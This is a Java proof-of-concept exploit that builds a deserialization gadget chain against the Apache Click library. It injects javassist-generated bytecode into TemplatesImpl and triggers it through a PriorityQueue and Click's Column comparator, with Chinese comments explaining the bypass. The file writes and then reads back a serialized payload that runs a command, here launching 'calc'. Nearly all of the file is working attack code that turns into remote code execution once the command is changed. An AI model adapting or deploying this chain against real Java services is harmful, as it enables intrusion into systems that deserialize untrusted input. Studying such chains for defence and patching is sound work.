package Click;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.click.control.Column;
import org.apache.click.control.Table;
import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

public class payload {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Firebasky");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        //生成字节码
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", targetByteCodes);
        setFieldValue(obj, "_name", "TemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final Column column = new Column("lowestSetBit");
        column.setTable(new Table());
        Comparator comparator = column.getComparator();//

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        //排序后set进去
        /**
         * 这里其实在用调getlowestSetBit方法去比较并排序两个new BigInteger(“1”)。
         * 排序之前name被设置为lowestSetBit，排序之后利用反射重置name为outputProperties，
         * 两个new BigInteger(“1”)也被重置为TemplatesImpl。
         * 序列化之后再用readObject触发，是用非常巧妙的方式绕过了可以排序和比较的类型(Comparabl接口)限制。
         */
        column.setName("outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});


        //序列化
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("1.ser"));
        objectOutputStream.writeObject(queue);
        objectOutputStream.close();
        //反序列化
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("1.ser"));
        objectInputStream.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

}
